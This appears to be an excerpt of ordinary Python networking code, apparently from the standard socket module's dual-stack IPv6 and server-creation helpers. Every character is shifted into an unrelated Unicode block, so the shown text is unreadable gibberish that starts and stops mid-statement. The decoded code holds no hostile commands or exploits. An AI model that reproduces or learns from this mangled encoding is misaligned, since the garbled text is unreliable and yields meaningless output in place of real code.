ꚫꛑꛬ꛷꛾꛰ꚷꚕꚫꚫꚫꚫꛬ꛹ꛯꚫꛬ꛹ꚫꛐ꜃ꛮ꛰꛻꛿꛴꛺꛹ꛒ꛽꛺꜀꛻ꚫ꛺꛱ꚫꛬ꛷꛷ꚫ꛰꛽꛽꛺꛽꛾ꚫ꛴꛱ꚫꚵꛬ꛷꛷ꛪ꛰꛽꛽꛺꛽꛾ꚵꚫ꛴꛾ꚫꛟ꛽꜀꛰ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚕꚫꚫꚫꚫ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚫꛈꚫꛬꛯꛯ꛽꛰꛾꛾ꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚫꛈꚫꛦꛨꚕꚫꚫꚫꚫ꛱꛺꛽ꚫ꛽꛰꛾ꚫ꛴꛹ꚫ꛲꛰꛿ꛬꛯꛯ꛽꛴꛹꛱꛺ꚳ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚷꚫꚻꚷꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬ꛱ꚷꚫ꛾꛺ꛮ꛶꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫꛮꛬ꛹꛺꛹꛹ꛬ꛸꛰ꚷꚫ꛾ꛬꚫꛈꚫ꛽꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳꛬ꛱ꚷꚫ꛾꛺ꛮ꛶꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛴꛸꛰꛺꜀꛿ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛪꛒꛗꛚꛍꛌꛗꛪꛏꛐꛑꛌꛠꛗꛟꛪꛟꛔꛘꛐꛚꛠꛟꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛿꛴꛸꛰꛺꜀꛿ꚳ꛿꛴꛸꛰꛺꜀꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛺꜀꛽ꛮ꛰ꛪꛬꛯꛯ꛽꛰꛾꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛭ꛴꛹ꛯꚳ꛾꛺꜀꛽ꛮ꛰ꛪꛬꛯꛯ꛽꛰꛾꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛮ꛺꛹꛹꛰ꛮ꛿ꚳ꛾ꛬꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛍ꛽꛰ꛬ꛶ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫꛬꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚫꛮ꜄ꛮ꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚹꛮ꛷꛰ꛬ꛽ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰꜃ꛮꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛬ꛷꛷ꛪ꛰꛽꛽꛺꛽꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚹꛮ꛷꛰ꛬ꛽ꚳꚴꚫꚫꚮꚫ꛽ꛬ꛴꛾꛰ꚫ꛺꛹꛷꜄ꚫ꛿꛳꛰ꚫ꛷ꛬ꛾꛿ꚫ꛰꛽꛽꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꛰꜃ꛮꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛺ꛮ꛶ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛷꛰꛹ꚳ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛬ꛷꛷ꛪ꛰꛽꛽꛺꛽꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꛦꚻꛨꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛐ꜃ꛮ꛰꛻꛿꛴꛺꛹ꛒ꛽꛺꜀꛻ꚳꚭꛮ꛽꛰ꛬ꛿꛰ꛪꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚫ꛱ꛬ꛴꛷꛰ꛯꚭꚷꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛍ꛽꛰ꛬ꛶ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫꛬꚫ꛽꛰꛱꛰꛽꛰꛹ꛮ꛰ꚫꛮ꜄ꛮ꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹꛾ꚹꛮ꛷꛰ꛬ꛽ꚳꚴꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫ꛰꛽꛽꛺꛽ꚳꚭ꛲꛰꛿ꛬꛯꛯ꛽꛴꛹꛱꛺ꚫ꛽꛰꛿꜀꛽꛹꛾ꚫꛬ꛹ꚫ꛰꛸꛻꛿꜄ꚫ꛷꛴꛾꛿ꚭꚴꚕꚕꚕꛯ꛰꛱ꚫ꛳ꛬ꛾ꛪꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚳꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫꛟ꛽꜀꛰ꚫ꛴꛱ꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚫ꛾꜀꛻꛻꛺꛽꛿꛾ꚫꛮ꛽꛰ꛬ꛿꛴꛹꛲ꚫꛬꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫ꜂꛳꛴ꛮ꛳ꚫꛮꛬ꛹ꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫꛭ꛺꛿꛳ꚫꛌꛑꛪꛔꛙꛐꛟꚫꛬ꛹ꛯꚫꛌꛑꛪꛔꛙꛐꛟꛁꚫꚳꛔꛛ꜁ꚿꚫꚺꚫꛔꛛ꜁ꛁꚴꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹꛾ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛪ꛴꛻꜁ꛁꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛽ꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚲꛔꛛꛛꛝꛚꛟꛚꛪꛔꛛꛡꛁꚲꚴꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛽ꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚲꛔꛛꛡꛁꛪꛡꛁꛚꛙꛗꛤꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛑꛬ꛷꛾꛰ꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛴꛿꛳ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꛌꛑꛪꛔꛙꛐꛟꛁꚷꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚴꚫꛬ꛾ꚫ꛾꛺ꛮ꛶ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛔꛛꛛꛝꛚꛟꛚꛪꛔꛛꛡꛁꚷꚫꛔꛛꛡꛁꛪꛡꛁꛚꛙꛗꛤꚷꚫꚻꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛟ꛽꜀꛰ꚕꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛑꛬ꛷꛾꛰ꚕꚕꚕꛯ꛰꛱ꚫꛮ꛽꛰ꛬ꛿꛰ꛪ꛾꛰꛽꜁꛰꛽ꚳꛬꛯꛯ꛽꛰꛾꛾ꚷꚫꚵꚷꚫ꛱ꛬ꛸꛴꛷꜄ꛈꛌꛑꛪꛔꛙꛐꛟꚷꚫꛭꛬꛮ꛶꛷꛺꛲ꛈꛙ꛺꛹꛰ꚷꚫ꛽꛰꜀꛾꛰ꛪ꛻꛺꛽꛿ꛈꛑꛬ꛷꛾꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꛈꛑꛬ꛷꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛹꜁꛰꛹꛴꛰꛹ꛮ꛰ꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚫ꜂꛳꛴ꛮ꛳ꚫꛮ꛽꛰ꛬ꛿꛰꛾ꚫꛬꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚫ꛿꜄꛻꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫꛭ꛺꜀꛹ꛯꚫ꛿꛺ꚫꚵꛬꛯꛯ꛽꛰꛾꛾ꚵꚫꚳꛬꚫꚽꚸ꛿꜀꛻꛷꛰ꚫꚳ꛳꛺꛾꛿ꚷꚫ꛻꛺꛽꛿ꚴꚴꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚕꚫꚫꚫꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚕꚕꚫꚫꚫꚫꚵ꛱ꛬ꛸꛴꛷꜄ꚵꚫ꛾꛳꛺꜀꛷ꛯꚫꛭ꛰ꚫ꛰꛴꛿꛳꛰꛽ꚫꛌꛑꛪꛔꛙꛐꛟꚫ꛺꛽ꚫꛌꛑꛪꛔꛙꛐꛟꛁꚹꚕꚫꚫꚫꚫꚵꛭꛬꛮ꛶꛷꛺꛲ꚵꚫ꛴꛾ꚫ꛿꛳꛰ꚫ꛼꜀꛰꜀꛰ꚫ꛾꛴꜅꛰ꚫ꛻ꛬ꛾꛾꛰ꛯꚫ꛿꛺ꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛷꛴꛾꛿꛰꛹ꚳꚴꚹꚕꚫꚫꚫꚫꚵ꛽꛰꜀꛾꛰ꛪ꛻꛺꛽꛿ꚵꚫꛯ꛴ꛮ꛿ꛬ꛿꛰꛾ꚫ꜂꛳꛰꛿꛳꛰꛽ꚫ꛿꛺ꚫ꜀꛾꛰ꚫ꛿꛳꛰ꚫꛞꛚꛪꛝꛐꛠꛞꛐꛛꛚꛝꛟꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛻꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚵꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚵꛅꚫ꛴꛱ꚫ꛿꛽꜀꛰ꚫꛬ꛹ꛯꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚫ꛾꜀꛻꛻꛺꛽꛿꛾ꚫ꛴꛿ꚷꚫ꛴꛿ꚫ꜂꛴꛷꛷ꚕꚫꚫꚫꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬ꛹ꚫꛌꛑꛪꛔꛙꛐꛟꛁꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛬꛭ꛷꛰ꚫ꛿꛺ꚫꛬꛮꛮ꛰꛻꛿ꚫꛭ꛺꛿꛳ꚫꛔꛛ꜁ꚿꚫ꛺꛽ꚫꛔꛛ꜁ꛁꚕꚫꚫꚫꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹꛾ꚹꚫꛢ꛳꛰꛹ꚫ꛱ꛬ꛷꛾꛰ꚫ꛴꛿ꚫ꜂꛴꛷꛷ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫꛯ꛴꛾ꛬꛭ꛷꛰ꚫ꛿꛳꛴꛾ꚫ꛺꛻꛿꛴꛺꛹ꚫ꛺꛹ꚕꚫꚫꚫꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚫ꛿꛳ꛬ꛿ꚫ꛰꛹ꛬꛭ꛷꛰ꚫ꛴꛿ꚫꛭ꜄ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫꚳ꛰ꚹ꛲ꚹꚫꛗ꛴꛹꜀꜃ꚴꚹꚕꚕꚫꚫꚫꚫꛉꛉꛉꚫ꜂꛴꛿꛳ꚫꛮ꛽꛰ꛬ꛿꛰ꛪ꛾꛰꛽꜁꛰꛽ꚳꚳꚲꚲꚷꚫꛃꚻꚻꚻꚴꚴꚫꛬ꛾ꚫ꛾꛰꛽꜁꛰꛽ꛅꚕꚫꚫꚫꚫꚹꚹꚹꚫꚫꚫꚫꚫ꜂꛳꛴꛷꛰ꚫꛟ꛽꜀꛰ꛅꚕꚫꚫꚫꚫꚹꚹꚹꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛹ꚷꚫꛬꛯꛯ꛽ꚫꛈꚫ꛾꛰꛽꜁꛰꛽ꚹꛬꛮꛮ꛰꛻꛿ꚳꚴꚕꚫꚫꚫꚫꚹꚹꚹꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛳ꛬ꛹ꛯ꛷꛰ꚫ꛹꛰꜂ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫ꛴꛱ꚫ꛽꛰꜀꛾꛰ꛪ꛻꛺꛽꛿ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭꛞꛚꛪꛝꛐꛠꛞꛐꛛꛚꛝꛟꚭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛞꛚꛪꛝꛐꛠꛞꛐꛛꛚꛝꛟꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛺꛹ꚫ꛿꛳꛴꛾ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚭꚴꚕꚫꚫꚫꚫ꛴꛱ꚫꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛳ꛬ꛾ꛪꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚳꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫ꛺꛹ꚫ꛿꛳꛴꛾ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚫꚬꛈꚫꛌꛑꛪꛔꛙꛐꛟꛁꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꚫ꛽꛰꛼꜀꛴꛽꛰꛾ꚫꛌꛑꛪꛔꛙꛐꛟꛁꚫ꛱ꛬ꛸꛴꛷꜄ꚭꚴꚕꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚴꚕꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛙ꛺꛿꛰ꚫꛬꛭ꛺꜀꛿ꚫꛢ꛴꛹ꛯ꛺꜂꛾ꚹꚫꛢ꛰ꚫꛯ꛺꛹ꚲ꛿ꚫ꛾꛰꛿ꚫꛞꛚꛪꛝꛐꛠꛞꛐꛌꛏꛏꛝꚫꛭ꛰ꛮꛬ꜀꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꚼꚴꚫꛔ꛿ꚲ꛾ꚫ꜀꛹꛹꛰ꛮ꛰꛾꛾ꛬ꛽꜄ꛅꚫꛭ꛴꛹ꛯꚳꚴꚫ꜂꛴꛷꛷ꚫ꛾꜀ꛮꛮ꛰꛰ꛯꚫ꛰꜁꛰꛹ꚫ꛴꛹ꚫꛮꛬ꛾꛰ꚫ꛺꛱ꚫꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛻꛽꛰꜁꛴꛺꜀꛾ꚫꛮ꛷꛺꛾꛰ꛯꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫꛬ꛹ꛯꚫ꛾꛿꛴꛷꛷ꚫ꛴꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛟꛔꛘꛐꛪꛢꛌꛔꛟꚫ꛾꛿ꛬ꛿꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꚽꚴꚫꛔ꛱ꚫ꛾꛰꛿ꚷꚫꛬ꛹꛺꛿꛳꛰꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛾ꚫ꛱꛽꛰꛰ꚫ꛿꛺ꚫꛭ꛴꛹ꛯꚳꚴꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛬꛯꛯ꛽꛰꛾꛾ꚷꚫ꛰꛱꛱꛰ꛮ꛿꛴꜁꛰꛷꜄ꚫ꛻꛽꛰꜁꛰꛹꛿꛴꛹꛲ꚫ꛿꛳꛴꛾ꚫ꛺꛹꛰ꚫ꛱꛽꛺꛸ꚫꛬꛮꛮ꛰꛻꛿꛴꛹꛲ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹꛾ꚹꚫꛌ꛷꛾꛺ꚷꚫ꛴꛿ꚫ꛸ꛬ꜄ꚫ꛾꛰꛿ꚫ꛿꛳꛰ꚫ꛻꛽꛺ꛮ꛰꛾꛾ꚫ꛴꛹ꚫꛬꚫ꛾꛿ꛬ꛿꛰ꚫ꜂꛳꛰꛽꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛴꛿ꚲ꛷꛷ꚫ꛹꛺ꚫ꛷꛺꛹꛲꛰꛽ꚫ꛽꛰꛾꛻꛺꛹ꛯꚫ꛿꛺ꚫꛬ꛹꜄ꚫ꛾꛴꛲꛹ꛬ꛷꛾ꚫ꛺꛽ꚫ꛲꛽ꛬꛮ꛰꛱꜀꛷ꚫ꛶꛴꛷꛷꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛞ꛰꛰ꛅꚫ꛳꛿꛿꛻꛾ꛅꚺꚺ꛷꛰ꛬ꛽꛹ꚹ꛸꛴ꛮ꛽꛺꛾꛺꛱꛿ꚹꛮ꛺꛸ꚺ꜂꛴꛹ꛯ꛺꜂꛾ꚺ꜂꛴꛹ꚾꚽꚺ꜂꛴꛹꛾꛺ꛮ꛶ꚺ꜀꛾꛴꛹꛲ꚸ꛾꛺ꚸ꛽꛰꜀꛾꛰ꛬꛯꛯ꛽ꚸꛬ꛹ꛯꚸ꛾꛺ꚸ꛰꜃ꛮ꛷꜀꛾꛴꜁꛰ꛬꛯꛯ꛽꜀꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛺꛾ꚹ꛹ꛬ꛸꛰ꚫ꛹꛺꛿ꚫ꛴꛹ꚫꚳꚲ꛹꛿ꚲꚷꚫꚲꛮ꜄꛲꜂꛴꛹ꚲꚴꚫꛬ꛹ꛯꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚲꛞꛚꛪꛝꛐꛠꛞꛐꛌꛏꛏꛝꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚷꚫꛞꛚꛪꛝꛐꛠꛞꛐꛌꛏꛏꛝꚷꚫꚼꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛑꛬ꛴꛷ꚫ꛷ꛬ꛿꛰꛽ꚫ꛺꛹ꚫꛭ꛴꛹ꛯꚳꚴꚷꚫ꛱꛺꛽ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸꛾ꚫ꜂꛳꛴ꛮ꛳ꚫ꛸ꛬ꜄ꚫ꛹꛺꛿ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛾꜀꛻꛻꛺꛽꛿ꚫ꛿꛳꛴꛾ꚫ꛺꛻꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛽꛰꜀꛾꛰ꛪ꛻꛺꛽꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚷꚫꛞꛚꛪꛝꛐꛠꛞꛐꛛꛚꛝꛟꚷꚫꚼꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛪ꛴꛻꜁ꛁꚫꛬ꛹ꛯꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꛈꚫꛌꛑꛪꛔꛙꛐꛟꛁꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛯ꜀ꛬ꛷꛾꛿ꛬꛮ꛶ꛪ꛴꛻꜁ꛁꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛔꛛꛛꛝꛚꛟꛚꛪꛔꛛꛡꛁꚷꚫꛔꛛꛡꛁꛪꛡꛁꛚꛙꛗꛤꚷꚫꚻꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭꛔꛛꛡꛁꛪꛡꛁꛚꛙꛗꛤꚭꚴꚫꛬ꛹ꛯꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭꛔꛛꛛꛝꛚꛟꛚꛪꛔꛛꛡꛁꚭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹ꛾꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛔꛛꛛꛝꛚꛟꛚꛪꛔꛛꛡꛁꚷꚫꛔꛛꛡꛁꛪꛡꛁꛚꛙꛗꛤꚷꚫꚼꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꚹꛭ꛴꛹ꛯꚳꛬꛯꛯ꛽꛰꛾꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛰꛽꛽꛺꛽ꚫꛬ꛾ꚫ꛰꛽꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꚫꛈꚫꚲꚰ꛾ꚫꚳ꜂꛳꛴꛷꛰ꚫꛬ꛿꛿꛰꛸꛻꛿꛴꛹꛲ꚫ꛿꛺ꚫꛭ꛴꛹ꛯꚫ꛺꛹ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫꚰ꛽ꚴꚲꚫꚰꚫꛧꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚳ꛰꛽꛽ꚹ꛾꛿꛽꛰꛽꛽꛺꛽ꚷꚫꛬꛯꛯ꛽꛰꛾꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫ꛰꛽꛽꛺꛽ꚳ꛰꛽꛽ꚹ꛰꛽꛽꛹꛺ꚷꚫ꛸꛾꛲ꚴꚫ꛱꛽꛺꛸ꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ